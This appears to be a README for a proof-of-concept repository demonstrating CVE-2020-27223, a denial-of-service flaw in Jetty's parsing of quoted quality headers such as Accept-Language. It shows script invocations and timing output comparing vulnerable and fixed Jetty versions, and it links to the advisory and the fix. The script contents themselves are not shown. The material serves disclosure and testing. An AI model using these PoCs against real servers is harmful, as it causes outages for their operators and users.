# CVE-2020-27223

## Using

```
$ mvn spring-boot:run
```

### 9.4.36.v20210114

```
$ ./poc/cve-2020-27223-poc1.sh
{"time_ns":"58,557","accept_language":"aab"}
real	0m0.093s 🐇
user	0m0.006s
sys	0m0.007s
{"time_ns":"18,461,763,438","accept_language":"ahn"}
real	0m35.339s 🐢
user	0m0.006s
sys	0m0.006s
```

### 9.4.37.v20210219 (Fixed)

```
$ ./poc/cve-2020-27223-poc1.sh
{"time_ns":"36,675","accept_language":"aab"}
real	0m0.023s 🐇
user	0m0.005s
sys	0m0.007s
{"time_ns":"1,265,004","accept_language":"ahn"}
real	0m0.024s 🐇
user	0m0.006s
sys	0m0.006s
```

## PoC

```
$ ./poc/cve-2020-27223-poc2.sh
curl: (28) Operation timed out after 120000 milliseconds with 0 bytes received

real	2m0.025s
user	0m0.016s
sys	0m0.009s
```

## References

- [DOS vulnerability for Quoted Quality CSV headers · Advisory · eclipse/jetty.project](https://github.com/eclipse/jetty.project/security/advisories/GHSA-m394-8rww-3jr7)
- [Merge pull request from GHSA-m394-8rww-3jr7 · eclipse/jetty.project@10e5317](https://github.com/eclipse/jetty.project/commit/10e531756b972162eed402c44d0244f7f6b85131)
